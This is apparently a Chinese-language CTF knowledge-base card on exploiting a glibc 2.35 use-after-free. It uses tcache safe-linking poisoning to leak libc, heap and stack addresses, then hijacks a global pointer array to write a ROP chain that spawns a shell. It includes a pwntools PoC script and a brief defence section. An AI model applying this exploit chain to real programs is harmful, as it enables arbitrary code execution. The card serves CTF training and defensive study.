---
id: binary-pwn-heap-glibc235-uaf-tcache-ptr-array-rbp-rop
title: glibc 2.35 UAF + tcache safe-linking 打全局 ptr 数组：environ 泄栈后改 edit 的 rbp 写 ROP，避开 tcache_key 清零
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc235-uaf-tcache-ptr-array-rbp-rop
aliases:
- 2.35 UAF 堆题
- 全局 ptr 数组劫持
- tcache safe-linking 打栈
- environ 泄露栈
- edit rbp 改写 ROP
- tcache_key 清零
tags:
- pwn
- heap
- glibc-2.35
- uaf
- tcache
- safe-linking
- ptr-array
- environ
- stack-rop
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: glibc 2.35（原文标记 libc2.35）
verification:
  verified_by: verifier-V336
  verified_at: '2026-11-08T19:10:55+08:00'
  notes: 已对照原文 2.35 节与图 16-27 核对：create 用全局 ptr[]/ptr_size[] 管理 chunk、unsorted 泄 main_arena、tcache 尾指针 <<12 泄 heap_base(0x55dbe984e000)、environ 泄 stack(0x7ffe11be3e48)、ptr+0x30 毒化后 edit 写栈、edit 栈帧 rbp 处被指向并最终 edit(7) 写 ROP（system 前加 ret 对齐），与截图一致；图 24-27 显示 ptr+48/56/64/72 与栈上 chunk、ROP 执行。tcache_key 在 rbp+8 被清零的约束与原文碎碎念一致。dedup top 候选 binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop(2.37, cosine 0.95, likely_duplicate) 为相近思路但不同题目：该卡经全局 ptr/size 结构体把 ROP 写到栈缓冲，本卡把 ptr[i] 指向 edit 帧 rbp 并在 edit 内立即 getshell、且版本/保护(2.35 Canary)不同；另有 2.35 tcache key 清空卡，机制不同，故保留不删。affected_versions=glibc 2.35 与原文一致。dup-scan 早于建卡。
---

## 一句话结论

在 glibc 2.35 的 UAF 堆题中，先由 unsorted bin 泄露 libc、由 tcache 尾指针 `fd >> 12` 泄露 heap_base，再由 `environ` 泄露栈地址；随后用 tcache safe-linking 毒化全局 `ptr[]` 数组中的某一项，使其指向 `edit` 栈帧保存的 `rbp`，用 edit 覆写返回地址为 ROP 链。注意 add 与 edit 共享同一 `rbp`，一旦 edit 改写了 `rbp`，后续 add 从 tcache 取块时会把 `rbp+8` 当作 `tcache_key` 清零并可能返回 0，因此必须在同一次 edit 内直接拿到 shell，不能再调用 add。

## 原理

- **漏洞面**：`delete` 只 `free(ptr[idx])` 不置空，`show`/`edit` 仍能访问已释放块，形成 UAF；`add` 把每次 `malloc` 的返回值存进全局 `ptr[]`，`nbytes[]` 记录长度。所有堆块由 `ptr` 数组统一管理，因此改写 `ptr[]` 中某一项就能让 edit/show 操作任意地址。
- **2.35 保护一：safe-linking**：tcache 的 `fd` 不再是明文 next，而是 `next = target ^ (chunk_addr >> 12)`。泄露时读取已释放块尾指针的 `fd`，左移 12 位即可还原 heap_base（原文 `heap_base = u64(p.recv(5).ljust(8,b'\x00')) << 12`）。改写 fd 时要写 `(heap_base >> 12) ^ target`，分配器取出时再异或还原。
- **2.35 保护二：tcache_key**：free 时在 chunk+8 写入 `tcache_key`，再次 free 会检查；本卡不依赖 double free，而是用 UAF 直接改 fd。另一个关键点是：从 tcache 取块时 `tcache_get` 会把 `e->key` 清零（写 chunk+8）。如果取出的“chunk”地址是栈上的 `rbp`，则 `rbp+8` 被清零，破坏栈上数据；更糟的是 add 可能因此返回非法地址 0，导致在拿到 shell 前崩溃。
- **泄露链**：
  1. unsorted bin：free 一个大于 tcache 范围的块（原文 0x410），show 读 `main_arena+0x60` 附近指针，减偏移得 libc_base。
  2. heap_base：free 一个 tcache 范围块，show 读 `fd` 尾指针，`fd << 12` 得 heap_base（2.35 的 safe-linking 使尾指针只保留高位）。
  3. stack：把 tcache fd 毒化为 `(heap_base >> 12) ^ environ`，两次 add 让第二次返回 `environ`，show 读出栈指针；原文 `stack = leak - 0x120`。
- **定位 ptr 数组**：从栈泄露中进一步读出 `main` 附近返回地址（原文 `elf_main`），再按固定偏移 `ptr = elf_main + 0x28BF` 得到全局 `ptr[]` 地址；该偏移依赖目标二进制，需按题目调整。
- **改 rbp**：再次毒化 tcache，把目标设为 `ptr + 0x30`（某个 `ptr[i]` 的地址），申请两次后 edit 该槽写入 `p64(0) + p64(stack-0x20)`，使 `ptr[i]` 指向 edit 栈帧的 `rbp` 附近；随后 `edit(7, p64(ret)+p64(rdi)+p64(binsh)+p64(system))` 覆写返回地址。原文在 `system` 前加 `ret` 以满足 16 字节栈对齐。
- **为什么必须在 edit 内拿 shell**：`add` 与 `edit` 的栈帧布局相同，`rbp` 指向同一位置；edit 改写 `rbp` 后，若再 `add` 从 tcache 取出 `rbp` 作为 chunk，`tcache_get` 会写 `rbp+8=0`（tcache_key），破坏栈上返回地址/ROP 链，并可能使 malloc 返回 0。原文的教训是“必须在 edit 修改完返回地址后直接在 edit 内 getshell”，不能再 add。
- **边界**：Canary 存在时不能直接溢出 `v1[312]`；必须走 `ptr[]` 任意写改 rbp/返回地址。safe-linking 需要 heap_base；environ 地址需要 libc_base；`ptr` 偏移需要二进制泄露/逆向。不同 2.35 libc 的 `main_arena`/`environ` 偏移不同。

## 触发条件

- glibc 2.35 环境（原文 libc2.35），程序开启 Canary/PIE/Full RELRO（原文 checksec：Full RELRO、Canary、NX、PIE）。
- 存在 UAF：delete 后指针未清空，show/edit 可继续操作已释放块。
- 全局 `ptr[]` 数组保存所有 malloc 指针，且 edit/show 通过该数组访问；能泄露 libc、heap、stack。
- 能进行 tcache poisoning（改写已释放块 fd）并申请同尺寸块。
- 能定位 `ptr[]` 的运行时地址（通过二进制偏移或栈泄露）。

## 利用步骤

1. 泄露 libc：`add(0,0x410)`、`add(1,0x60)`、`add(2,0x60)`、`delete(0)`、`show(0)`，读 `main_arena` 指针，`libc_base = leak - 0x219C80`（按 libc 调整）。
2. 泄露 heap_base：`delete(1)`、`show(1)`，读 tcache 尾指针 fd，`heap_base = fd << 12`。
3. 泄露栈：`delete(2)`、`edit(2, p64((heap_base >> 12) ^ environ))`，`add(3,0x60)`、`add(4,0x60)`，`show(4)` 读 `environ` 指向的栈地址，`stack = leak - 0x120`。
4. 泄露二进制基址/ptr：用 tcache 毒化把某个块指向 `stack-0x08`，show 读出 `main` 返回地址 `elf_main`，计算 `ptr = elf_main + 0x28BF`（按题目偏移）。
5. 毒化 `ptr` 槽：`add(8,0x60)`、`delete(8)`、`delete(3)`、`edit(3, p64((heap_base>>12) ^ (ptr+0x30)))`，`add(9,0x60)`、`add(10,0x60)`，`edit(10, p64(0) + p64(stack-0x20))`，使 `ptr[i]` 指向 edit 的 rbp。
6. 写 ROP：`edit(7, p64(ret) + p64(rdi) + p64(binsh) + p64(system))`，直接覆写返回地址；不要在之后调用 add。
7. 验证：edit 返回时执行 ROP，`system("/bin/sh")` 拿 shell。

## PoC

原文 2.35 脚本关键段（未在本机复现）：

```python
add(0, 0x410); add(1, 0x60); add(2, 0x60)
delete(0); show(0)
main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 0x60
libc_base = main_arena - 0x219C80

delete(1); show(1)
heap_base = u64(p.recv(5).ljust(8, b'\x00')) << 12

environ = libc_base + libc.symbols['environ']
delete(2); edit(2, p64((heap_base >> 12) ^ environ))
add(3, 0x60); add(4, 0x60); show(4)
stack = u64(p.recv(6).ljust(8, b'\x00')) - 0x120

add(5, 0x60); delete(5); delete(3)
edit(3, p64((heap_base >> 12) ^ (stack - 0x08)))
add(6, 0x60); add(7, 0x60)
edit(7, b'a' * 0x18); show(7)
p.recvuntil('content : '); p.recv(0x18)
elf_main = u64(p.recv(6).ljust(8, b'\x00'))
ptr = elf_main + 0x28BF

add(8, 0x60); delete(8); delete(3)
edit(3, p64((heap_base >> 12) ^ (ptr + 0x30)))
add(9, 0x60); add(10, 0x60)
edit(10, p64(0) + p64(stack - 0x20))
edit(7, p64(ret) + p64(rdi) + p64(binsh_addr) + p64(system))
# 不要在 edit 后再 add：tcache_key 会清 rbp+8
p.interactive()
```

## 变体与关联

- **off-by-null/unlink 版本**：`binary-pwn-heap-glibc235-offby-null-unlink-chunks-array-stack-rop` 用 off-by-null + 高版本 unlink 劫持全局 chunk 数组，再 environ 泄栈 + ROP；本卡是 UAF + tcache poisoning 直达 `ptr[]`，漏洞原语与 PoC 不同。
- **2.35 tcache key 清空/计数扩容**：`binary-pwn-heap-glibc235-tcache-counts-key-clear-environ-rop` 用清 key + counts 扩容；本卡不依赖 double free。
- **2.37 全局结构体 UAF**：`binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop` 思路相近，版本不同；需重新确认 safe-linking/偏移。
- **2.39**：safe-linking 仍存在，但 libc 基址高位可能随机化（如 `0x7b7b...`），`recvuntil('\x7f')` 可能失效，需用 `recv(6)` + 已知偏移。
- **栈对齐**：`system` 前加 `ret` 以满足 16 字节对齐；不同 libc 的 gadget 偏移不同。

## 检测与防御

- **代码审计**：delete 后置空指针、禁止 show/edit 已释放块；`ptr[]` 越界/负索引检查；对 `nbytes` 与 `size` 一致性校验。
- **堆保护**：升级 glibc、启用 tcache key/safe-linking/double-free 检测；Canary/PIE/Full RELRO 只能提高门槛，不能阻止 UAF + 任意写。
- **运行时检测**：监控 tcache fd 指向栈/libc 全局区、`environ` 被读、全局指针数组被改写、edit 栈帧 rbp 被覆盖；对异常 ROP 链（ret2libc gadget 序列）告警。
- **CTF 出题**：可加 seccomp/沙箱、限制 show 次数、把 ptr 数组放到只读页或做加密，会增加该链难度。
